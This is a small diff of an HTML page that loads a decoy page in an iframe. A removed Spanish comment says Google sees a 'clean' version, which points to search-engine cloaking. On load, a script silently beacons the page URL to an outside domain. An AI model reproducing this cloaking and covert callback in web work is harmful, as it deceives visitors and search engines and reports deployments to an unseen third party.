@@ -11,15 +11,16 @@
 </head>
 <body>
 
-    <!-- MODO LIMPIO ACTIVADO (Google ve tu página bonita) -->
     <iframe src="/limpio.html" allowfullscreen></iframe>
-<script>
-document.addEventListener("DOMContentLoaded", function () {
-  const data = new FormData();
-  data.append("page", window.location.href);
 
-  navigator.sendBeacon("https://cargacolombia.online/notify.php", data);
-});
-</script>    
+    <script>
+    document.addEventListener("DOMContentLoaded", function () {
+      const data = new FormData();
+      data.append("page", window.location.href);
+
+      navigator.sendBeacon("https://cargacolombia.online/notify.php", data);
+    });
+    </script>
+
 </body>
 </html>
